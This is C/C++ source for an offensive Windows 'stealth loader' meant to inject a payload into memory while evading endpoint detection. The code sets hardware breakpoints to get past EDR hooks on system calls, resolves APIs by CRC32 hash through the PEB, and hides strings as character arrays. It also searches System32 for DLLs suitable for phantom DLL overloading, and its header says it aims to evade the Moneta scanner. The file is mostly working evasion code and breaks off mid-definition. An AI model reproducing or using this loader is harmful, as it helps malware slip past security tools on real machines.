/****
 * Stealth NZ loader: a APC write method with custom phantom DLL overloading
 * Add syscall for create thread
 * With option -ldr to add PEB to module list to evade Moneta
 * Local inejction only 
 * TODO: Add indirect syscall with Halo's gate method to replace NT functions used. 
 * Author: Thomas X Meng
 * 
*/
#include <windows.h>
#include <winternl.h> // For NTSTATUS definitions
#include <psapi.h>
#include <stdlib.h> // For ExitProcess
#include <tlhelp32.h>
#include <stdio.h>
#include <ctype.h>

///For dynamic loading: 
#include <stdint.h>
#include "processthreadsapi.h"
#include "libloaderapi.h"
#include <winnt.h>
#include <lmcons.h>
// #include "HardwareBreakpoints.h"


// Standalone function to delay execution using WaitForSingleObjectEx
void SimpleSleep(DWORD dwMilliseconds)
{
    HANDLE hEvent = CreateEvent(NULL, TRUE, FALSE, NULL); // Create an unsignaled event
    if (hEvent != NULL)
    {
        WaitForSingleObjectEx(hEvent, dwMilliseconds, FALSE); // Wait for the specified duration
        CloseHandle(hEvent); // Clean up the event object
    }
}

#include <shlwapi.h> // For PathRemoveFileSpec
#pragma comment(lib, "Shlwapi.lib")

// Function to write memory content to a file
BOOL WriteMemoryToFile(const wchar_t* fileName, PVOID memoryPtr, SIZE_T memorySize) {
    HANDLE hFile;
    DWORD written;

    // Open the file
    hFile = CreateFileW(fileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        wprintf(L"Failed to create file %s. Error: %lu\n", fileName, GetLastError());
        return FALSE;
    }

    // Write the memory content to the file
    BOOL result = WriteFile(hFile, memoryPtr, (DWORD)memorySize, &written, NULL);
    CloseHandle(hFile);

    if (!result) {
        wprintf(L"Failed to write to file. Error: %lu\n", GetLastError());
        return FALSE;
    }

    return TRUE;
}

// BOOL ChangeMemoryProtectionToNoAccess(const MEMORY_BASIC_INFORMATION* Mbi) {
//     DWORD oldProtect;
//     BOOL result = VirtualProtect(Mbi->BaseAddress, Mbi->RegionSize, PAGE_NOACCESS, &oldProtect);
//     if (result == FALSE) {
//         // Handle error. Use GetLastError() to get more details.
//         printf("Error changing memory protection to PAGE_NOACCESS. Error: %lu\n", GetLastError());
//     }
//     return result;
// }
/////////////////////////// Breakpoint test, TODO: 

BOOL SetSyscallBreakpoints(LPVOID nt_func_addr, HANDLE thread_handle);

typedef struct {
    unsigned int  dr0_local : 1;
    unsigned int  dr0_global : 1;
    unsigned int  dr1_local : 1;
    unsigned int  dr1_global : 1;
    unsigned int  dr2_local : 1;
    unsigned int  dr2_global : 1;
    unsigned int  dr3_local : 1;
    unsigned int  dr3_global : 1;
    unsigned int  local_enabled : 1;
    unsigned int  global_enabled : 1;
    unsigned int  reserved_10 : 1;
    unsigned int  rtm : 1;
    unsigned int  reserved_12 : 1;
    unsigned int  gd : 1;
    unsigned int  reserved_14_15 : 2;
    unsigned int  dr0_break : 2;
    unsigned int  dr0_len : 2;
    unsigned int  dr1_break : 2;
    unsigned int  dr1_len : 2;
    unsigned int  dr2_break : 2;
    unsigned int  dr2_len : 2;
    unsigned int  dr3_break : 2;
    unsigned int  dr3_len : 2;
} dr7_t;



// find the address of the syscall and retn instruction within a Nt* function
BOOL FindSyscallInstruction(LPVOID nt_func_addr, LPVOID* syscall_addr, LPVOID* syscall_ret_addr) {
    BYTE* ptr = (BYTE*)nt_func_addr;

    // iterate through the native function stub to find the syscall instruction
    for (int i = 0; i < 1024; i++) {

        // check for syscall opcode (FF 05)
        if (ptr[i] == 0x0F && ptr[i + 1] == 0x05) {
            printf("Found syscall opcode at 0x%llx\n", (DWORD64)&ptr[i]);
            *syscall_addr = (LPVOID)&ptr[i];
            *syscall_ret_addr = (LPVOID)&ptr[i + 2];
            break;
        }
    }

    // make sure we found the syscall instruction
    if (!*syscall_addr) {
        printf("error: syscall instruction not found\n");
        return FALSE;
    }

    // make sure the instruction after syscall is retn
    if (**(BYTE**)syscall_ret_addr != 0xc3) {
        printf("Error: syscall instruction not followed by ret\n");
        return FALSE;
    }

    return TRUE;
}

// set a breakpoint on the syscall and retn instruction of a Nt* function
BOOL SetSyscallBreakpoints(LPVOID nt_func_addr, HANDLE thread_handle) {
    LPVOID syscall_addr, syscall_ret_addr;
    CONTEXT thread_context = { 0 };
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");

    if (!FindSyscallInstruction(nt_func_addr, &syscall_addr, &syscall_ret_addr)) {
        return FALSE;
    }

    thread_context.ContextFlags = CONTEXT_FULL;

    // get the current thread context (note, this must be a suspended thread)
    if (!GetThreadContext(thread_handle, &thread_context)) {
        printf("GetThreadContext() failed, error: %d\n", GetLastError());
        return FALSE;
    }

    dr7_t dr7 = { 0 };

    dr7.dr0_local = 1; // set DR0 as an execute breakpoint
    dr7.dr1_local = 1; // set DR1 as an execute breakpoint

    thread_context.ContextFlags = CONTEXT_ALL;

    thread_context.Dr0 = (DWORD64)syscall_addr;     // set DR0 to break on syscall address
    thread_context.Dr1 = (DWORD64)syscall_ret_addr; // set DR1 to break on syscall ret address
    thread_context.Dr7 = *(DWORD*)&dr7;

    // use SetThreadContext to update the debug registers
    if (!SetThreadContext(thread_handle, &thread_context)) {
        printf("SetThreadContext() failed, error: %d\n", GetLastError());
    }

    printf("Hardware breakpoints set\n");
    return TRUE;
}


int g_bypass_method = 1;
HANDLE g_thread_handle = NULL;
// PCONTEXT g_thread_context = NULL;

typedef NTSTATUS (WINAPI* t_NtSetContextThread)(
	HANDLE ThreadHandle, PCONTEXT Context
	);

t_NtSetContextThread NtSetContextThread;

typedef NTSTATUS (WINAPI* t_NtResumeThread)(
    HANDLE ThreadHandle,
    PULONG SuspendCount
);

t_NtResumeThread NtResumeThread;

// typedef NTSTATUS (NTAPI *t_NtCreateThreadEx)(
//     PHANDLE hThread,
//     ACCESS_MASK DesiredAccess,
//     PVOID ObjectAttributes,
//     HANDLE ProcessHandle,
//     PVOID lpStartAddress,
//     PVOID lpParameter,
//     ULONG Flags,
//     SIZE_T StackZeroBits,
//     SIZE_T SizeOfStackCommit,
//     SIZE_T SizeOfStackReserve,
//     PVOID lpBytesBuffer);

// t_NtCreateThreadEx NtCreateThreadEx;

// dynamically resolve the required ntdll functions
BOOL ResolveNativeApis()
{
	HMODULE ntdll = GetModuleHandleA("ntdll.dll");
	if (!ntdll)
		return FALSE;

	NtSetContextThread = (t_NtSetContextThread)GetProcAddress(ntdll, "NtSetContextThread");
	if (!NtSetContextThread)
		return FALSE;

    NtResumeThread = (t_NtResumeThread)GetProcAddress(ntdll, "NtResumeThread");
    if (!NtResumeThread)
        return FALSE;

    // NtCreateThreadEx = (t_NtCreateThreadEx)GetProcAddress(ntdll, "NtCreateThreadEx");

	return TRUE;
}



// a separate thread for calling SetResumeThread so we can set hardware breakpoints
//This function can be any function you would like to use as decoy to cause the exception.
DWORD SetResumeThread(LPVOID param) {

    HANDLE hThreadd = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)0x7FF7A2A7, NULL, CREATE_SUSPENDED, NULL);
	// call NtSetContextThread with fake parameters (can be anything but we chose NULL)
	NTSTATUS status = NtResumeThread(hThreadd, NULL);
	if (!NT_SUCCESS(status)) {
		printf("NtResumeThread failed, error: %x\n", status);
		return -1;
	}

	return 0;
}



// DWORD SetCreateThread(LPVOID param) {

//     HANDLE g_thread_handle = NULL;
// 	// call NtSetContextThread with fake parameters (can be anything but we chose NULL)
// 	NTSTATUS status = NtCreateThreadEx(&g_thread_handle, GENERIC_EXECUTE, NULL, GetCurrentProcess(), (LPTHREAD_START_ROUTINE)0x7FF7A2A7, NULL, FALSE, 0, 0, 0, NULL);
// 	if (!NT_SUCCESS(status)) {
// 		printf("NtCreateThreadEx failed, error: %x\n", status);
// 		return -1;
// 	}

// 	return 0;
// }


// exception handler for hardware breakpoints
LONG WINAPI BreakpointHandler(PEXCEPTION_POINTERS e)
{
	// hardware breakpoints trigger a single step exception
	if (e->ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP) {
		// this exception was caused by DR0 (syscall breakpoint)
		if (e->ContextRecord->Dr6 & 0x1) {
			printf("syscall breakpoint triggered at address: 0x%llx\n",
				   (DWORD64)e->ExceptionRecord->ExceptionAddress);

			// replace the fake parameters with the real ones
			e->ContextRecord->Rcx = (DWORD64)g_thread_handle;
			e->ContextRecord->R10 = (DWORD64)g_thread_handle;
			// e->ContextRecord->Rdx = NULL;
			// e->ContextRecord->Rdx = (DWORD64)g_thread_context;
			/// for CreateThread
			// e->ContextRecord->Rcx = (DWORD64)NULL;
			// e->ContextRecord->R10 = (DWORD64)0;
			// e->ContextRecord->Rdx = (DWORD64)0;
			// e->ContextRecord->R8 = (LPTHREAD_START_ROUTINE)g_allocBuffer
		}

		// this exception was caused by DR1 (syscall ret breakpoint)
		if (e->ContextRecord->Dr6 & 0x2) {
			printf("syscall ret breakpoint triggered at address: 0x%llx\n",
				   (DWORD64)e->ExceptionRecord->ExceptionAddress);
            // e->ContextRecord->Rax = 0xC0000156; // STATUS too many secrets.

			// set the parameters back to fake ones
			// since x64 uses registers for the first 4 parameters, we don't need to do anything here
			// for calls with more than 4 parameters, we'd need to modify the stack
		}
	}

	e->ContextRecord->EFlags |= (1 << 16); // set the ResumeFlag to continue execution

	return EXCEPTION_CONTINUE_EXECUTION;
}


//Method 1: 
BOOL BypassHookUsingBreakpoints() {
	// set an exception handler to handle hardware breakpoints
	SetUnhandledExceptionFilter(BreakpointHandler);

	// create a new thread to call SetThreadContext in a suspended state so we can modify its own context
	HANDLE new_thread = CreateThread(NULL, 0, SetResumeThread,
									 NULL, CREATE_SUSPENDED, NULL);
	if (!new_thread) {
		printf("CreateThread() failed, error: %d\n", GetLastError());
		return FALSE;
	} else {
        printf("CreateThread() success\n");
    }

	// set our hardware breakpoints before and after the syscall in the NtResumeThread stub
	SetSyscallBreakpoints((LPVOID)NtResumeThread, new_thread);
    printf("Hardware breakpoints set\n");
	ResumeThread(new_thread);

	// wait until the SetThreadContext thread has finished before continuing
	// WaitForSingleObject(new_thread, INFINITE);

	return TRUE;
}

////////////////////////// Breakpoint test: 

void ManualInitUnicodeString(PUNICODE_STRING DestinationString, PCWSTR SourceString) {
    DestinationString->Length = wcslen(SourceString) * sizeof(WCHAR);
    DestinationString->MaximumLength = DestinationString->Length + sizeof(WCHAR);
    DestinationString->Buffer = (PWSTR)SourceString;
}

// typedef NTSTATUS (NTAPI *NtProtectVirtualMemory_t)(
//     HANDLE ProcessHandle,
//     PVOID *BaseAddress,
//     SIZE_T *NumberOfBytesToProtect,
//     ULONG NewAccessProtection,
//     PULONG OldAccessProtection);

/////////////////////////// Change state, TODO:  

// typedef enum _PROCESS_STATE_CHANGE_TYPE {
//     ThreadStateChangeSuspend,
//     ThreadStateChangeResume,
//     ProcessStateChangeMax,
// } PROCESS_STATE_CHANGE_TYPE, *PPROCESS_STATE_CHANGE_TYPE;

typedef enum _THREAD_STATE_CHANGE_TYPE
{
    ThreadStateChangeSuspend,
    ThreadStateChangeResume,
    ThreadStateChangeMax,
} THREAD_STATE_CHANGE_TYPE, *PTHREAD_STATE_CHANGE_TYPE;


typedef NTSTATUS (NTAPI *pNtCreateThreadStateChange)(
    PHANDLE ThreadStateChangeHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ThreadHandle,
    ULONG64 Reserved
);

typedef NTSTATUS (NTAPI *pNtChangeThreadState)(
    HANDLE ThreadStateChangeHandle,
    HANDLE ThreadHandle,
    ULONG Action,
    PVOID ExtendedInformation,
    SIZE_T ExtendedInformationLength,
    ULONG64 Reserved
);

typedef NTSTATUS (NTAPI *pNtCreateProcessStateChange)(
    PHANDLE StateChangeHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ProcessHandle,
    ULONG64 Reserved
);

typedef NTSTATUS (NTAPI *pNtChangeProcessState)(
    HANDLE StateChangeHandle,
    HANDLE ProcessHandle,
    ULONG Action,
    PVOID ExtendedInformation,
    SIZE_T ExtendedInformationLength,
    ULONG64 Reserved
);


////// Test alert: 

#pragma comment(lib, "ntdll")
using myNtTestAlert = NTSTATUS(NTAPI*)();

///////////////////////////////

/////////////////////////////////// Dynamic loading: 
#define ADDR unsigned __int64

uint32_t crc32c(const char *s) {
    int      i;
    uint32_t crc=0;
    
    while (*s) {
        crc ^= (uint8_t)(*s++ | 0x20);
        
        for (i=0; i<8; i++) {
            crc = (crc >> 1) ^ (0x82F63B78 * (crc & 1));
        }
    }
    return crc;
}

// Utility function to convert an UNICODE_STRING to a char*
HRESULT UnicodeToAnsi(LPCOLESTR pszW, LPSTR* ppszA) {
	ULONG cbAnsi, cCharacters;
	DWORD dwError;
	// If input is null then just return the same.    
	if (pszW == NULL)
	{
		*ppszA = NULL;
		return NOERROR;
	}
	cCharacters = wcslen(pszW) + 1;
	cbAnsi = cCharacters * 2;

	*ppszA = (LPSTR)CoTaskMemAlloc(cbAnsi);
	if (NULL == *ppszA)
		return E_OUTOFMEMORY;

	if (0 == WideCharToMultiByte(CP_ACP, 0, pszW, cCharacters, *ppszA, cbAnsi, NULL, NULL))
	{
		dwError = GetLastError();
		CoTaskMemFree(*ppszA);
		*ppszA = NULL;
		return HRESULT_FROM_WIN32(dwError);
	}
	return NOERROR;
}

namespace dynamic {
    // Dynamically finds the base address of a DLL in memory
    ADDR find_dll_base(const char* dll_name) {
        // Note: the PEB can also be found using NtQueryInformationProcess, but this technique requires a call to GetProcAddress
        //  and GetModuleHandle which defeats the very purpose of this PoC
        // Well, this is a chicken and egg problem, we have to call those 2 functions stealthly. 
        PTEB teb = reinterpret_cast<PTEB>(__readgsqword(reinterpret_cast<DWORD_PTR>(&static_cast<NT_TIB*>(nullptr)->Self)));
        PPEB_LDR_DATA loader = teb->ProcessEnvironmentBlock->Ldr;

        PLIST_ENTRY head = &loader->InMemoryOrderModuleList;
        PLIST_ENTRY curr = head->Flink;

        // Iterate through every loaded DLL in the current process
        do {
            PLDR_DATA_TABLE_ENTRY dllEntry = CONTAINING_RECORD(curr, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
            char* dllName;
            // Convert unicode buffer into char buffer for the time of the comparison, then free it
            UnicodeToAnsi(dllEntry->FullDllName.Buffer, &dllName);
            char* result = strstr(dllName, dll_name);
            CoTaskMemFree(dllName); // Free buffer allocated by UnicodeToAnsi

            if (result != NULL) {
                // Found the DLL entry in the PEB, return its base address
                return (ADDR)dllEntry->DllBase;
            }
            curr = curr->Flink;
        } while (curr != head);

        return NULL;
    }

    // Given the base address of a DLL in memory, returns the address of an exported function
    ADDR find_dll_export(ADDR dll_base, const char* export_name) {
        // Read the DLL PE header and NT header
        PIMAGE_DOS_HEADER peHeader = (PIMAGE_DOS_HEADER)dll_base;
        PIMAGE_NT_HEADERS peNtHeaders = (PIMAGE_NT_HEADERS)(dll_base + peHeader->e_lfanew);

        // The RVA of the export table if indicated in the PE optional header
        // Read it, and read the export table by adding the RVA to the DLL base address in memory
        DWORD exportDescriptorOffset = peNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        PIMAGE_EXPORT_DIRECTORY exportTable = (PIMAGE_EXPORT_DIRECTORY)(dll_base + exportDescriptorOffset);

        // Browse every export of the DLL. For the i-th export:
        // - The i-th element of the name table contains the export name
        // - The i-th element of the ordinal table contains the index with which the functions table must be indexed to get the final function address
        DWORD* name_table = (DWORD*)(dll_base + exportTable->AddressOfNames);
        WORD* ordinal_table = (WORD*)(dll_base + exportTable->AddressOfNameOrdinals);
        DWORD* func_table = (DWORD*)(dll_base + exportTable->AddressOfFunctions);

        for (int i = 0; i < exportTable->NumberOfNames; ++i) {
            char* funcName = (char*)(dll_base + name_table[i]);
            ADDR func_ptr = dll_base + func_table[ordinal_table[i]];
            if (!_strcmpi(funcName, export_name)) {
                return func_ptr;
            }
        }

        return NULL;
    }

    // Given the base address of a DLL in memory, returns the address of an exported function by hash
    ADDR find_dll_export_by_hash(ADDR dll_base, uint32_t target_hash) {
        PIMAGE_DOS_HEADER peHeader = (PIMAGE_DOS_HEADER)dll_base;
        PIMAGE_NT_HEADERS peNtHeaders = (PIMAGE_NT_HEADERS)(dll_base + peHeader->e_lfanew);
        DWORD exportDescriptorOffset = peNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        PIMAGE_EXPORT_DIRECTORY exportTable = (PIMAGE_EXPORT_DIRECTORY)(dll_base + exportDescriptorOffset);

        DWORD* name_table = (DWORD*)(dll_base + exportTable->AddressOfNames);
        WORD* ordinal_table = (WORD*)(dll_base + exportTable->AddressOfNameOrdinals);
        DWORD* func_table = (DWORD*)(dll_base + exportTable->AddressOfFunctions);

        for (DWORD i = 0; i < exportTable->NumberOfNames; ++i) {
            char* funcName = (char*)(dll_base + name_table[i]);
            uint32_t hash = crc32c(funcName);
            if (hash == target_hash) {
                ADDR func_ptr = dll_base + func_table[ordinal_table[i]];
                return func_ptr;
            }
        }

        return NULL; // Function not found
    }


    using LoadLibraryPrototype = HMODULE(WINAPI*)(LPCWSTR);
    LoadLibraryPrototype loadFuture;
    using GetModuleHandlePrototype = HMODULE(WINAPI*)(LPCSTR);
    GetModuleHandlePrototype GetModuleHandle;
    using GetProcAddressPrototype = FARPROC(WINAPI*)(HMODULE, LPCSTR);
    GetProcAddressPrototype NotGetProcAddress;

    void resolve_imports(void) {

        const char essentialLib[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0 };
        const char EssentialLib[] = { 'K', 'E', 'R', 'N', 'E', 'L', '3', '2', '.', 'D', 'L', 'L', 0 };
        const char CrucialLib[] = { 'N', 'T', 'D', 'L', 'L', 0 };
        const char crucialLib[] = { 'n', 't', 'd', 'l', 'l', 0 };
        const char GetFutureStr[] = { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's', 's', 0 };
        const char LoadFutureStr[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'W', 0 };
        const char GetModuleHandleStr[] = { 'G', 'e', 't', 'M', 'o', 'd', 'u', 'l', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 'A', 0 };
        ADDR kernel32_base = find_dll_base(EssentialLib);
        ADDR ntdll_base = find_dll_base(CrucialLib);
        // Example hashes for critical functions
        uint32_t hash_GetProcAddress = crc32c(GetFutureStr);
        uint32_t hash_LoadLibraryW = crc32c(LoadFutureStr);
        uint32_t hash_GetModuleHandleA = crc32c(GetModuleHandleStr);
        const char NtCreateThreadStr[] = { 'N', 't', 'C', 'r', 'e', 'a', 't', 'e', 'T', 'h', 'r', 'e', 'a', 'd', 0 };
        uint32_t hash_NtCreateThread = crc32c(NtCreateThreadStr);
        printf("[+] Hash of NtCreateThread: %x\n", hash_NtCreateThread);
        // printf the hash to user:
        printf("[+] Hash of GetProcAddress: %x\n", hash_GetProcAddress);
        printf("[+] Hash of LoadLibraryW: %x\n", hash_LoadLibraryW);

        // Resolve functions by hash
        dynamic::NotGetProcAddress = (GetProcAddressPrototype)find_dll_export_by_hash(kernel32_base, hash_GetProcAddress);
        dynamic::GetModuleHandle = (GetModuleHandlePrototype)find_dll_export_by_hash(kernel32_base, hash_GetModuleHandleA);
        #define _import(_name, _type) ((_type) dynamic::NotGetProcAddress(dynamic::GetModuleHandle(essentialLib), _name))
        // dynamic::NotGetProcAddress = (GetProcAddressPrototype)find_dll_export_by_hash(ntdll_base, hash_GetProcAddress);
        // dynamic::GetModuleHandle = (GetModuleHandlePrototype)find_dll_export_by_hash(ntdll_base, hash_GetModuleHandleA);
        // #define _import(_name, _type) ((_type) dynamic::NotGetProcAddress(dynamic::GetModuleHandle(crucialLib), _name))
        #define _import_crucial(_name, _type) ((_type) dynamic::NotGetProcAddress(dynamic::GetModuleHandle(crucialLib), _name))
        // #define _import_crucial(_name, _type) ((_type) dynamic::NotGetProcAddress(dynamic::GetModuleessentialLibHandle(crucialLib), _name))

        dynamic::loadFuture = (LoadLibraryPrototype) _import(LoadFutureStr, LoadLibraryPrototype);    
        // Verify the resolution
        if (dynamic::NotGetProcAddress != NULL && dynamic::loadFuture != NULL && dynamic::GetModuleHandle != NULL) {
            printf("[+] APIs resolved by hash successfully.\n");
        } else {
            printf("[-] Error resolving APIs by hash.\n");
        }

        // dynamic::GetProcAddress = (GetProcAddressPrototype) find_dll_export(kernel32_base, "GetProcAddress");
        // dynamic::GetModuleHandle = (GetModuleHandlePrototype) find_dll_export(kernel32_base, "GetModuleHandleA");
        // #define _import(_name, _type) ((_type) dynamic::GetProcAddress(dynamic::GetModuleHandle("kernel32.dll"), _name))
        // dynamic::loadFuture = (LoadLibraryPrototype) _import("LoadLibraryW", LoadLibraryPrototype);
        printf("[+] LoadLibrary: %p\n", loadFuture);
    }
}
////////////////////////////////////
const char* ProtectionToString(DWORD protection) {
    switch (protection) {
        case PAGE_NOACCESS: return "PAGE_NOACCESS";
        case PAGE_READONLY: return "PAGE_READONLY";
        case PAGE_READWRITE: return "PAGE_READWRITE";
        case PAGE_WRITECOPY: return "PAGE_WRITECOPY";
        case PAGE_EXECUTE: return "PAGE_EXECUTE";
        case PAGE_EXECUTE_READ: return "PAGE_EXECUTE_READ";
        case PAGE_EXECUTE_READWRITE: return "PAGE_EXECUTE_READWRITE";
        case PAGE_EXECUTE_WRITECOPY: return "PAGE_EXECUTE_WRITECOPY";
        case PAGE_GUARD: return "PAGE_GUARD";
        case PAGE_NOCACHE: return "PAGE_NOCACHE";
        case PAGE_WRITECOMBINE: return "PAGE_WRITECOMBINE";
        default: return "UNKNOWN";
    }
}


// Necessary for certain definitions like ACCESS_MASK
#ifndef WIN32_NO_STATUS
#define WIN32_NO_STATUS
#include <ntstatus.h>
#undef WIN32_NO_STATUS
#else
#include <ntstatus.h>
#endif
#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif

BOOL FindSuitableDLL(wchar_t* dllPath, SIZE_T bufferSize, DWORD requiredSize, BOOL bTxF, int dllOrder);
BOOL PrintSectionDetails(const wchar_t* dllPath);

void PrintUsageAndExit() {
    wprintf(L"Usage: loader_21.exe [-txf] [-dll <order>] [-h]\n");
    wprintf(L"Options:\n");
    wprintf(L"  -txf                Use Transactional NTFS (TxF) for DLL loading.\n");
    wprintf(L"  -dll <order>        Specify the order of the suitable DLL to use (default is 1). Not all DLLs are suitable for overloading\n");
    wprintf(L"  -h                  Print this help message and exit.\n");
    wprintf(L"  -thread             Use an alternative NT call other than the NT create thread\n");
    wprintf(L"  -pool               Use Threadpool for APC Write\n");
    wprintf(L"  -ldr                use LdrLoadDll instead of NtCreateSection->NtMapViewOfSection\n");
    ExitProcess(0);
}


BOOL ValidateDLLCharacteristics(const wchar_t* dllPath, uint32_t requiredSize, bool dotnet = FALSE) {
    HANDLE hFile = CreateFileW(dllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return FALSE; // Cannot open file
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    BYTE* buffer = new BYTE[fileSize]; // Allocate buffer for the whole file
    DWORD bytesRead;
    if (!ReadFile(hFile, buffer, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        CloseHandle(hFile);
        delete[] buffer;
        return FALSE; // Failed to read file
    }

    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)buffer;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        CloseHandle(hFile);
        delete[] buffer;
        return FALSE; // Not a valid PE file
    }


    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(buffer + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        CloseHandle(hFile);
        delete[] buffer;
        return FALSE; // Not a valid PE file
    }

    if(dotnet) {
        // Verify it's a .NET assembly by checking the CLR header
        IMAGE_DATA_DIRECTORY* clrDataDirectory = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR];
        if (clrDataDirectory->VirtualAddress == 0 || clrDataDirectory->Size == 0) {
            // Not a .NET assembly
            CloseHandle(hFile);
            delete[] buffer;
            return FALSE;
        }
    }
    // Check if SizeOfImage is sufficient
    if (ntHeaders->OptionalHeader.SizeOfImage < requiredSize) {
        CloseHandle(hFile);
        return FALSE; // Image size is not sufficient
    }

    printf("[+] SizeOfImage: %lu\n", ntHeaders->OptionalHeader.SizeOfImage);

    BOOL textSectionFound = FALSE;
    IMAGE_SECTION_HEADER* sectionHeaders = NULL;
    if(!dotnet) {
        // Validate the .text section specifically
        sectionHeaders = (IMAGE_SECTION_HEADER*)((BYTE*)ntHeaders + sizeof(IMAGE_NT_HEADERS));
        // BOOL textSectionFound = FALSE;
        for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
            IMAGE_SECTION_HEADER* section = &sectionHeaders[i];
            if (strncmp((char*)section->Name, ".text", 5) == 0) {
                textSectionFound = TRUE;
                if (section->Misc.VirtualSize < requiredSize) {
                    CloseHandle(hFile);
                    delete[] buffer;
                    return FALSE; // .text section size is not sufficient
                }
                break;
            }
        }
    } else {
        textSectionFound = TRUE;
    }

    // /// TODO: test shared meme:
    // BOOL textSectionShared = FALSE;
    // sectionHeaders = (IMAGE_SECTION_HEADER*)((BYTE*)ntHeaders + sizeof(IMAGE_NT_HEADERS));
    // for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
    //     if (strncmp((char*)sectionHeaders[i].Name, ".text", 5) == 0 && (sectionHeaders[i].Characteristics & IMAGE_SCN_MEM_SHARED)) {
    //         textSectionShared = TRUE;
    //         printf("[+] .text section is shared\n \n \n");
    //         break;
    //     }
    // }
    /// TODO: test shared meme:

    if(!dotnet) {
        printf("[+] .text section found: %s\n", textSectionFound ? "Yes" : "No");
        // printf("[+] .text section shared: %s\n", textSectionShared ? "Yes" : "No");
        //print the size of the .text section in human readable format:
        printf("[+] .text section size: %lu bytes\n", sectionHeaders->Misc.VirtualSize);
        printf("[+] .text section characteristics: ");
        if (sectionHeaders->Characteristics & IMAGE_SCN_CNT_CODE) {
            printf("CODE ");
        }
        if (sectionHeaders->Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            printf("EXECUTE ");
        }
        if (sectionHeaders->Characteristics & IMAGE_SCN_MEM_READ) {
            printf("READ ");
        }
        if (sectionHeaders->Characteristics & IMAGE_SCN_MEM_WRITE) {
            printf("WRITE ");
        }
        printf("\n");

    }

    if (!textSectionFound) {
        CloseHandle(hFile);
        delete[] buffer;
        return FALSE; // .text section not found
    }

    CloseHandle(hFile);
    delete[] buffer;
    return TRUE; // DLL is suitable
}


BOOL FindSuitableDLL(wchar_t* dllPath, SIZE_T bufferSize, DWORD requiredSize, BOOL bTxF, int dllOrder, bool dotnet = FALSE) {
    WIN32_FIND_DATAW findData;
    HANDLE hFind = INVALID_HANDLE_VALUE;
    wchar_t systemDir[MAX_PATH] = { 0 };
    wchar_t searchPath[MAX_PATH] = { 0 };
    int foundCount = 0; // Count of suitable DLLs found

    // Get the system directory path
    if (!GetSystemDirectoryW(systemDir, _countof(systemDir))) {
        wprintf(L"Failed to get system directory. Error: %lu\n", GetLastError());
        return FALSE;
    }

    // Construct the search path for DLLs in the system directory
    swprintf_s(searchPath, _countof(searchPath), L"%s\\*.dll", systemDir);

    hFind = FindFirstFileW(searchPath, &findData);
    if (hFind == INVALID_HANDLE_VALUE) {
        wprintf(L"Failed to find first file. Error: %lu\n", GetLastError());
        return FALSE;
    }


    if(dotnet) {
        printf("\n [+] Looking for .NET assemblies\n");
    } else {
        printf("\n [+] Looking for normal suitable DLLs\n");
    }
    do {
        // Skip directories
        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            continue;
        }

        wchar_t fullPath[MAX_PATH];
        swprintf_s(fullPath, _countof(fullPath), L"%s\\%s", systemDir, findData.cFileName);

        if (GetModuleHandleW(findData.cFileName) == NULL && ValidateDLLCharacteristics(fullPath, requiredSize, dotnet)) {
            foundCount++; // Increment the suitable DLL count
            if (foundCount == dllOrder) { // If the count matches the specified order
                // For simplicity, we're not using bTxF here, but you could adjust your logic
                // to use it for filtering or preparing DLLs for TxF based operations.
                // swprintf_s(fullPath, MAX_PATH, L"%s\\%s", systemDir, findData.cFileName);
                wcsncpy_s(dllPath, bufferSize, fullPath, _TRUNCATE);
                FindClose(hFind);
                // TODO:enable the function below if you want to see the statistics of the dll you are going to use:
                // PrintSectionDetails(fullPath);
                return TRUE; // Found the DLL in the specified order
            }
        }
    } while (FindNextFileW(hFind, &findData));

    FindClose(hFind);
    return FALSE;
}


// Prototype for LdrLoadDll, which is not documented in Windows SDK headers.
typedef NTSTATUS (NTAPI *LdrLoadDll_t)(
    IN PWCHAR               PathToFile OPTIONAL,
    IN ULONG                Flags OPTIONAL,
    IN PUNICODE_STRING      ModuleFileName,
    OUT PHANDLE             ModuleHandle);

//////////////////////////////////// TxF: 
typedef NTSTATUS (NTAPI *pRtlCreateUserThread)(
    HANDLE ProcessHandle,
    PSECURITY_DESCRIPTOR SecurityDescriptor,
    BOOLEAN CreateSuspended,
    ULONG StackZeroBits,
    PULONG StackReserved,
    PULONG StackCommit,
    PVOID StartAddress,
    PVOID StartParameter,
    PHANDLE ThreadHandle,
    PCLIENT_ID ClientID);


// Define the NT API function pointers
